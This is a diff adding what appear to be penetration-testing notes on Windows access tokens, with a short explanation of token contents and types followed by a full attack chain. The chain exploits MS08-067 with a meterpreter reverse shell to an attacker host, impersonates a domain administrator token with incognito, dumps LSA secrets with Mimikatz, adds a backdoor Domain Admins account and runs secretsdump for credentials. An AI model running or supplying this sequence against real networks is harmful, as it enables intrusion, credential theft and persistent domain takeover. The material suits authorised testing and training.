@@ -1,0 +1,80 @@
+
+For ease of understanding, you can think of tokens as cookies for the computer. These temporary keys allow you access to a system, a network, or a resource without providing the credentials
+
+Access tokens contain the following information
+
+· The user’s SID *(Security Identifier)
+· SIDs for the groups of which the user is a member
+· A logon SID which identifies the current logon session
+· The user and group privileges
+· An owner SID
+· The SID for the primary group
+· The default DACL (Discretionary Access Control List) that the system uses when the user creates a securable object without specifying an* explicit security descriptor
+· The source of the access token
+· A flag that indicates the type of token. (*Primary \ Impersonation)
+· List of restricting SIDs *(optional)*
+· Current impersonation levels
+· Other statistics
+
+
+-- Types of Tokens --
+
+· Delegate Token
+· Impersonate Token
+
+Delegate Token are for the interactive logons, such as logging into the machine or connecting to it via Remote Desktop
+Impersonate Token are for the `non-interactive` sessions, such as attaching a network drive or a domain logon script
+
+A great thing about tokens is that they persist until the next reboot. When a user logs off, their delegate token is reported as an impersonate token. But that token will still hold all the rights of a delegate token.
+
+
+msf > use exploit/windows/smb/ms08_067_netapi
+msf exploit(ms08_067_netapi) > set RHOST 10.211.55.140
+msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf exploit(ms08_067_netapi) > set LHOST 10.211.55.162
+msf exploit(ms08_067_netapi) > set LANG english
+msf exploit(ms08_067_netapi) > show targets
+msf exploit(ms08_067_netapi) > set TARGET 8
+msf exploit(ms08_067_netapi) > exploit
+
+meterpreter > getuid
+meterpreter > use incognito
+meterpreter > load incognito
+meterpreter > help
+meterpreter > list_tokens -u
+meterpreter > impersonate_token SNEAKS.IN\\Administrator
+meterpreter > getuid
+meterpreter > shell
+
+PS C:\> Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /inject" exit' -Computer SNEAKS.Administrator.local
+PS C:\> Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /patch" exit' -Computer SNEAKS.Administrator.local
+
+C:\Windows\system32>net user /add hawkeye Passw0rd1@ /domain
+C:\Windows\system32>net group "Domain Admins" hawkeye /ADD /DOMAIN
+
+$ secretdump.py SNEAKS.local/Administrator:'Passw0rd1@'@10.0.0.225
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
